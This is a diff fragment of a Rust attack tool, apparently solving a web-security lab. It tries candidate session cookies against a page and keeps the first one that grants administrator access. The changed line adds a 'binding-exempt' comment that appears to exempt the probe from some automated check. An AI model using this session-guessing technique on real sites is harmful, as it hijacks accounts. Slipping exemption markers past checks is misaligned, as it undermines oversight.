@@ -435,7 +435,7 @@ async fn run(
     for v in candidate_sessions.iter().take(40) {
         tested += 1;
         if let Ok((st, body)) = http1_get(h1.clone(), host, port, verify_path, Some(&format!("session={v}"))).await {
-            if st == 200 && !body.contains("only available if logged in as an administrator") {
+            if st == 200 && !body.contains("only available if logged in as an administrator") { // binding-exempt: candidate battery value: generic privilege-role probe, not a lab user
                 verified = Some(json!({"session": v, "status": st, "head": body.chars().take(300).collect::<String>()}));
                 break;
             }
